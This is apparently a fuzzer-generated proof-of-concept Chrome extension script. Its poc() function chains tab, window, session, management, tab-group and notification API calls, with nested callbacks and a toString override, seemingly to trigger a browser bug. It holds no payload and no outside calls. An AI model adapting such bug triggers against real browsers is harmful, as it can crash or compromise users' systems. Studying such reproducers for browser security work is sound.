

function chrome_tabs_duplicate(tabId) {return new Promise(resolve => {chrome.tabs.duplicate(tabId, tab => resolve(tab));});}
function chrome_tabs_update(tabId, updateProperties) {return new Promise(resolve => {chrome.tabs.update(tabId, updateProperties, tab => resolve(tab));});}
function chrome_windows_getAll(getInfo) {return new Promise(resolve => {chrome.windows.getAll(getInfo, window => resolve(window));});}
function chrome_windows_create(createData) {return new Promise(resolve => {chrome.windows.create(createData, window => resolve(window));});}
function chrome_sessions_getRecentlyClosed(filter) {return new Promise(resolve => {chrome.sessions.getRecentlyClosed(filter, sessions => resolve(sessions));});}
function chrome_management_getAll() {return new Promise(resolve => {chrome.management.getAll(result => resolve(result));});}
function chrome_tabs_group(opts) {return new Promise(resolve => {chrome.tabs.group(opts, groupId => resolve(groupId));});}
function chrome_tabGroups_get(tabgroupId) {return new Promise(resolve => {chrome.tabGroups.get(tabgroupId, tabGroups => resolve(tabGroups));});}

async function poc(){
    try { chrome.processes.onExited.dispatch() } catch(e) {}
    try { var var02 = (await chrome_sessions_getRecentlyClosed({maxResults:4})) } catch(e) {}
    try { var var01 = var02[10].window } catch(e) {}
    try { var var05 = (await chrome_management_getAll()) } catch(e) {}
    try { var var04 = var05[1] } catch(e) {}
    try { var var03 = (await chrome.management.getPermissionWarningsById(var04.id)) } catch(e) {}
    try { var var07 = (await chrome_windows_getAll({populate:true, windowTypes:["devtools"]})) } catch(e) {}
    try { var var06 = var07[1] } catch(e) {}
    try { var var09 = (await chrome_tabs_update(undefined, {active:false, selected:true, pinned:true, muted:true})) } catch(e) {}
    try { var var08 = (await chrome_tabs_duplicate(var09.id)) } catch(e) {}
    try { var var13 = (await chrome_windows_create({tabId:var08.id})) } catch(e) {}
    try { var var12 = var13.id } catch(e) {}
    try { var var11 = (await chrome_tabs_group({tabIds:var09.id, createProperties:{windowId:var12}})) } catch(e) {}
    try { var var10 = (await chrome_tabGroups_get(var11)) } catch(e) {}
    try { var var14 = var09 } catch(e) {}
    try { var var15 = var02[33] } catch(e) {}
    try { var var16 = var02[5] } catch(e) {}
    try { await chrome.notifications.update(undefined, {}, function(param01){
        try {
             chrome.runtime.connect(var03[4].id, {});
             chrome.topSites.get(function(param02){
                 chrome.tabs.setZoomSettings(var08.id, {mode:"manual", scope:"per-origin", defaultZoomFactor:-1}, function(){
                     window.setTimeout(function() {
                         try { chrome.tabGroups.update(var10); } catch(e) {}}, 7*1*20);})});
                         chrome.action.getTitle({tabId:var09.id}, function(param03){
                             chrome.skiaBenchmarking.getOpTimings(function(){
                                 window.open('chrome://newtab/', "_self", "toolbar=true,scrollbars=false,resizable=false,top=0,left=2,width=1,height=95").dispatchEvent(new CustomEvent('onanimationend'))})});
                                 window.open(chrome.extension.getURL("js/1.html"), "_self", "toolbar=false,scrollbars=true,resizable=false,top=-1,left=9,width=0,height=32768").find(var05[5].name, true, true, false);
                                 chrome.idle.queryState(-1, function(param04){
                                     chrome.notifications.create(undefined, {}, function(param05){
                                         var12.toString = function(){
                                             try { var02[10].tab.discarded = true;;
                                                chrome.sessions.getDevices({maxResults:3}, function(param07){
                                                    chrome.tabs.sendMessage(var09.id, {}, {})}); 
                                                } catch(e) {}
                                            }
                                        })
                                    });
                                } catch(e) {}
                            })
                        } catch(e) {}
    try { chrome.tabGroups.get(var10) } catch(e) {}

}
poc();
